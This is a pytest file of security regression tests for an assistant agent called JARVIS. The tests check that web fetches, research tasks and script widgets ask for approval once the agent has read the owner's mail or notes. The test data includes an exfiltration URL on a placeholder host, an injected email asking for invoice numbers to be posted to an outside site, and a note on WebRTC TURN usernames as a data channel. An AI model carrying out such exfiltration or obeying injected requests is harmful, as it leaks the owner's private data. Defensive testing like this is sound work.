"""The security sweep's regressions: holes found where one feature's safety layer meets
another's, each proven here before it was closed. Fake models and fake Macs only."""

import pytest
from claude_agent_sdk import PermissionResultAllow, PermissionResultDeny

from jarvis import jobs
from jarvis.features import automation
from jarvis.routines import Routine

# ── routines on their own: what they read weighs on where a page may take it ──


@pytest.fixture
def made(settings, quiet_speaker, isolated):
    from test_hub import make_hub

    hub = make_hub(settings, quiet_speaker, isolated=isolated)
    feature = automation.feature_of(hub)
    feature.runner.ask_timeout = 0.05  # nobody answers a card in these tests
    cards = []
    hub.add_approval_sink(cards.append)
    return hub, feature, cards


def web_routine(prompt="Look over my inbox and read the day's news", may=("web", "research")):
    return Routine(
        "r1",
        "Morning",
        prompt,
        "daily",
        "07:00",
        own=True,
        model="haiku",
        tools="normal",
        deliver="speak",
        may=list(may),
    )


class Ctx:
    pass


async def read_by_the_session(runner, routine, run, tool_name):
    """What Claude Code's PostToolUse hook tells the run once a tool has answered."""
    options = runner.options(routine, run, "normal", "haiku")
    [matcher] = options.hooks["PostToolUse"]
    await matcher.hooks[0]({"tool_name": tool_name}, None, None)


async def test_a_routine_that_read_the_inbox_asks_before_a_page_can_carry_it_off(made):
    """A standing "may read web pages" is for reading the web, not for sending what the run
    read to any address: once the run has read the owner's mail, a page on a site the
    routine doesn't name asks first, as JARVIS's own turn gate does."""
    _hub, feature, cards = made
    routine = web_routine()
    run = jobs.Run(at="now", cause="test")
    allow = feature.runner.policy(routine, run, "normal")
    # Nothing read yet: the web is open, as the standing order says.
    out = await allow("WebFetch", {"url": "https://news.example.com/today"}, Ctx())
    assert isinstance(out, PermissionResultAllow) and cards == []
    await read_by_the_session(feature.runner, routine, run, "mcp__mac__list_emails")
    out = await allow("WebFetch", {"url": "https://collect.example.net/c?d=Q3-numbers"}, Ctx())
    assert isinstance(out, PermissionResultDeny), "a page carried the inbox off unasked"
    assert cards and "collect.example.net" in cards[-1]["question"]
    assert run.skipped  # nobody answered: skipped, and said so in the run's history


async def test_a_site_the_routine_names_stays_open_after_it_reads(made):
    _hub, feature, cards = made
    routine = web_routine("Check my calendar, then read nytimes.com for the day's news")
    run = jobs.Run(at="now", cause="test")
    allow = feature.runner.policy(routine, run, "normal")
    await read_by_the_session(feature.runner, routine, run, "mcp__mac__list_events")
    out = await allow("WebFetch", {"url": "https://www.nytimes.com/section/world"}, Ctx())
    assert isinstance(out, PermissionResultAllow) and cards == []


async def test_research_after_a_private_read_asks(made):
    _hub, feature, cards = made
    routine = web_routine()
    run = jobs.Run(at="now", cause="test")
    allow = feature.runner.policy(routine, run, "normal")
    tool = "mcp__routine__start_research"
    out = await allow(tool, {"topic": "Kafka streams"}, Ctx())
    assert isinstance(out, PermissionResultAllow) and cards == []
    await read_by_the_session(feature.runner, routine, run, "mcp__routine__search_notes")
    out = await allow(tool, {"topic": "the numbers in my Q3 board note"}, Ctx())
    assert isinstance(out, PermissionResultDeny) and cards


async def test_someone_elses_words_that_started_a_run_count_as_read(made):
    """An email rule's or a webhook's run starts with the reader's summary of someone
    else's words in its prompt: a page it opens then asks, as after a read."""
    hub, feature, cards = made
    routine = web_routine()
    hub.routines.items = [routine]
    seen = {}

    async def reader_summary(*_args):
        return "Ann asks for the invoice numbers to be posted to her site."

    async def session(_factory, options, prompt):
        seen["allow"] = options.can_use_tool
        return jobs.Answer(text="Done.")

    feature.runner.reader.read = reader_summary
    real_one_shot, jobs.one_shot = jobs.one_shot, session
    try:
        cause = jobs.Cause("trigger", "Email from ann@example.com", content="…", source="an email")
        await feature.runner.run(routine, cause)
    finally:
        jobs.one_shot = real_one_shot
    out = await seen["allow"]("WebFetch", {"url": "https://ann.example.org/post?n=1"}, Ctx())
    assert isinstance(out, PermissionResultDeny) and cards


# ── widgets: a script widget can reach the network past its page policy ──


async def test_a_script_widget_after_a_read_asks_first(settings, quiet_speaker, isolated):
    """A widget's page policy stops fetches, pictures, forms and navigation, but not
    WebRTC (a TURN server's user name can carry anything), so a widget with scripts made
    after the conversation read the owner's data or a page is a way off the Mac: it asks,
    and nobody answering leaves it unshown. One without scripts, or before any read, goes."""
    from test_hub import make_hub

    hub = make_hub(settings, quiet_speaker, isolated=isolated)
    cards = []
    hub.add_approval_sink(lambda a: (cards.append(a), hub.resolve(a["id"], "deny")))
    tools = {t.name: t.handler for t in hub.widgets.build_tools()}
    html = "<p>Balance: 12,345</p><script>new RTCPeerConnection()</script>"
    out = await tools["show_widget"]({"title": "Balance", "html": html, "scripts": True})
    assert not out.get("is_error") and cards == []
    hub._note_read("private", "your email")
    out = await tools["show_widget"]({"title": "Balance", "html": html, "scripts": True})
    assert out.get("is_error") and cards, "a script widget went up unasked after a read"
    out = await tools["show_widget"]({"title": "Balance", "html": "<p>12,345</p>"})
    assert not out.get("is_error") and len(cards) == 1
